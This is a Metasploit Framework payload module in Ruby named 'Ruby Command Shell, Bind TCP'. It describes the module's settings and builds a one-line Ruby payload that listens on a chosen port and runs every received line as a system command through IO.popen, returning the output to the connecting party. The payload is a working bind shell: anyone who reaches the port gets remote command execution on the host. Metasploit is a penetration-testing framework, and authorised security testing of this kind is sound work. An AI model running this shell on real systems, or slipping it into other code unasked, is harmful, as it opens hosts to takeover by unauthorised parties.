##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'        => 'Ruby Command Shell, Bind TCP',
			'Description' => 'Continually listen for a connection and spawn a command shell via Ruby',
			'Author'      => 'kris katterjohn',
			'License'     => MSF_LICENSE,
			'Platform'    => 'ruby',
			'Arch'        => ARCH_RUBY,
			'Handler'     => Msf::Handler::BindTcp,
			'Session'     => Msf::Sessions::CommandShell,
			'PayloadType' => 'ruby',
			'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
		))
	end

	def generate
		return super + ruby_string
	end

	def ruby_string
		"Thread.new{require 'socket';s=TCPServer.new(\"#{datastore['LPORT']}\");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end;end}"
	end
end
